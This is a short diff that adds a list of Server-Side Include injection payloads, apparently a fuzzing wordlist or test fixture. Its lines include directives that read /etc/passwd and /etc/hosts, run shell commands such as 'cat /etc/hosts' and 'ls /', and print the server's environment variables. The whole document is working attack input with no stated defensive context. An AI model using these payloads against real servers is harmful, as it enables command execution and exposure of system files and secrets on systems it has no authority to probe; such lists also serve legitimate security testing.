@@ -1,0 +1,7 @@
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="HTTP_USER_AGENT" -->
+<!--#include file="/etc/passwd" -->
+<!--#include file="/etc/hosts" -->
+<!--#exec cmd="cat /etc/hosts" -->
+<!--#exec cmd="ls /" -->
+<!--#printenv -->
